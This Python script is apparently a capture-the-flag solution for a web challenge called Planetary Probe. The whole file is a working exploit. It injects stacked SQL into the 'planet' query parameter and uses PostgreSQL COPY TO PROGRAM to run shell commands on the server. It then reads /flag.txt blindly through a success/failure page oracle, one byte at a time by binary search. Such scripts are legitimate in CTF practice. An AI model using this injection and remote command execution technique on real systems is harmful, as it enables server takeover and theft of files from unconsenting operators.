#!/usr/bin/env python3
"""Blindly recover Planetary Probe's flag through COPY TO PROGRAM."""

from __future__ import annotations

import argparse
import re
import sys
import time

import requests


DEFAULT_URL = "https://planetary.web.2026.sunshinectf.games"
BODY_CLASS_RE = re.compile(r'<body class="([^"]+)')


def sql_literal(value: str) -> str:
    """Return a PostgreSQL single-quoted string literal."""
    return "'" + value.replace("'", "''") + "'"


def shell_double_quote(value: str) -> str:
    """Quote a string for /bin/sh without allowing expansion."""
    value = value.replace("\\", "\\\\")
    value = value.replace('"', '\\"')
    value = value.replace("$", "\\$")
    value = value.replace("`", "\\`")
    return '"' + value + '"'


class Probe:
    def __init__(self, url: str, timeout: float, delay: float) -> None:
        self.url = url.rstrip("/") + "/probe"
        self.timeout = timeout
        self.delay = delay
        self.session = requests.Session()
        self.count = 0

    def command_succeeded(self, command: str) -> bool:
        # The final SELECT supplies a row only when COPY's child process exits
        # successfully. The application exposes that as carrier vs. null.
        payload = (
            "MARS'; COPY (SELECT 1) TO PROGRAM "
            + sql_literal(command)
            + "; SELECT 1;-- "
        )
        error: Exception | None = None
        for attempt in range(3):
            try:
                response = self.session.get(
                    self.url,
                    params={"planet": payload},
                    timeout=self.timeout,
                )
                response.raise_for_status()
                match = BODY_CLASS_RE.search(response.text)
                if not match:
                    raise RuntimeError("response did not contain a probe state")
                state = match.group(1)
                if "is-carrier" in state:
                    result = True
                elif "is-null" in state:
                    result = False
                else:
                    raise RuntimeError(f"unexpected probe state: {state}")
                self.count += 1
                if self.delay:
                    time.sleep(self.delay)
                return result
            except (requests.RequestException, RuntimeError) as exc:
                error = exc
                time.sleep(0.5 * (attempt + 1))
        raise RuntimeError(f"probe failed after retries: {error}")

    def prefix_equals(self, prefix: str) -> bool:
        command = (
            f"test \"$(head -c {len(prefix)} /flag.txt)\" = "
            f"{shell_double_quote(prefix)}"
        )
        return self.command_succeeded(command)

    def byte_comparison(self, position: int, operator: str, value: int) -> bool:
        # printf's shell extension converts a one-character string to its byte
        # value, avoiding locale-dependent string collation for underscores.
        command = (
            "test \"$(printf '%d' \"'$(head -c "
            f"{position} /flag.txt | tail -c 1)\")\" {operator} {value}"
        )
        return self.command_succeeded(command)


def recover(probe: Probe, prefix: str, max_length: int) -> str:
    if not probe.prefix_equals(prefix):
        raise RuntimeError(
            f"the file does not begin with {prefix!r}; check the target or --prefix"
        )

    flag = prefix
    print(f"[+] confirmed prefix: {flag}", flush=True)
    for position in range(len(prefix) + 1, max_length + 1):
        low, high = 32, 126
        while low < high:
            middle = (low + high) // 2
            if probe.byte_comparison(position, "-gt", middle):
                low = middle + 1
            else:
                high = middle

        char = chr(low)
        if not probe.byte_comparison(position, "-eq", low):
            raise RuntimeError(
                f"unexpected byte at offset {position}; printable ASCII was assumed"
            )
        flag += char
        print(f"[+] {flag}", flush=True)
        if char == "}":
            return flag

    raise RuntimeError(f"no closing brace found within {max_length} bytes")


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", default=DEFAULT_URL, help="challenge base URL")
    parser.add_argument("--prefix", default="sun{", help="known flag prefix")
    parser.add_argument("--max-length", type=int, default=80)
    parser.add_argument("--timeout", type=float, default=20.0)
    parser.add_argument(
        "--delay",
        type=float,
        default=0.15,
        help="seconds between requests; keep this serial and modest",
    )
    args = parser.parse_args()

    if args.max_length < len(args.prefix):
        parser.error("--max-length must be at least the length of --prefix")
    if args.delay < 0:
        parser.error("--delay cannot be negative")

    probe = Probe(args.url, args.timeout, args.delay)
    try:
        flag = recover(probe, args.prefix, args.max_length)
    except (requests.RequestException, RuntimeError) as exc:
        print(f"[-] {exc}", file=sys.stderr)
        return 1
    finally:
        probe.session.close()

    print(f"\n[+] flag: {flag}")
    print(f"[+] oracle requests: {probe.count}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
